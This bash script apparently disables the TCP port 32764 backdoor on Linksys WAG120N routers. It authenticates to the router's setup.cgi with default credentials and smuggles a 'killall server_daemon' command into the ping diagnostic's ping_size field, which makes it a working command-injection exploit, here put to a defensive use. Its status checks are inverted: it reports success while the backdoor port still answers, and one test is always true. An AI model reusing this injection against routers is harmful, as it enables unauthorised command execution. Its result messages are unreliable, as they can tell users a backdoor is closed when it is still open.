#!/bin/bash
echo "
 _____ _          _        _    _     _ 
|  ___(_)_ __ ___| |_     / \  (_) __| |
| |_  | | '__/ __| __|   / _ \ | |/ _\` |
|  _| | | |  \__ \ |_   / ___ \| | (_| |
|_|   |_|_|  |___/\__| /_/   \_\_|\__,_|
                                        
 This is TCP-32764-First-Aid (WAG120N)

 It tries to run 'killall server_daemon'
 on your router, disabling the backdoor.
 Everything happens in RAM and this isn't
 a permanent solution.

"

usage="$(basename "$0") [-h] [-i IP -u user -p password] -- small script to disable the 32764 backdoor in Linksys WAG120N (and maybe other too)

where:
    -h  show this help text
    -i  router IP address / host
    -u  admin user for the web management
    -p  admin password for the web management"

routerip=192.168.1.1
routeruser=admin
routerpassword=1234

while getopts ':i:u:p:' option; do
	case "$option" in
		i)
			routerip=$OPTARG
			;;
		u)
			routeruser=$OPTARG
			;;
		p)
			routerpassword=$OPTARG
			;;
		\?)
			echo "$usage"
			exit 1
			;;
	esac
done
shift $((OPTIND - 1))

echo -e "Starting router fix at $routerip\n"

nc -z $routerip 32764
if [ $? -ne 1 ] ; then
	echo -e "Oh noes! Looks like you've got a backdoor in $routerip:32764. Let me kill that for you\n"
else
	alreadydown=true
	echo -e "$routerip:32764 doesn't seem to be responding, maybe there isn't a backdoor there? But I'm going to try killing it just in case\n"
fi


curl --resolve $routerip:80:$routerip -u $routeruser:$routerpassword -d "ping_size=60&ping_number=1 $routerip%26%26/bin/echo%26%26/bin/killall%20server_daemon #&ping_interval=1000&ping_timeout=5000&todo=ping_test&this_file=&next_file=&c4_ping_ipaddr=$routerip&message=&h_wps_cur_status=" http://$routerip/setup.cgi

nc -z $routerip 32764
if [ $? -ne 1 ] ; then
	if [ alreadydown ] ; then
		echo -e "\nWell, I did my best, maybe it's down because of that or maybe it was down all along..."
	else
	        echo -e "\nSUCCESS: $routerip:32764 seems to be down"
	fi
else
	echo -e "\nFAIL: $routerip:32764 is still responding, so the fix must have failed"
fi
